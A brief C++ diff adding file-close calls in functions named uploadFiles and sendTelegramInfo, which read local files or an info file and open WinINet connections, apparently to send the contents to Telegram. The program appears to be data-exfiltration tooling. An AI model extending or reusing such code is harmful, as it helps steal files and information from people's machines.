@@ -514,6 +514,7 @@ void uploadFiles(vector<string> files) {
         ifstream rFile(file, ios::in);
         stringstream buffer;
         buffer << rFile.rdbuf();
+        rFile.close();
         string data = beggining + buffer.str() + ending;
 
         HINTERNET hsession = NULL, hconnect = NULL, hrequest = NULL;
@@ -858,6 +859,7 @@ void sendTelegramInfo() {
     ifstream rFile(INFOFILE, ios::in);
     stringstream buffer;
     buffer << rFile.rdbuf();
+    rFile.close();
     string data = beggining + buffer.str() + ending;
 
     HINTERNET hsession = NULL, hconnect = NULL, hrequest = NULL;
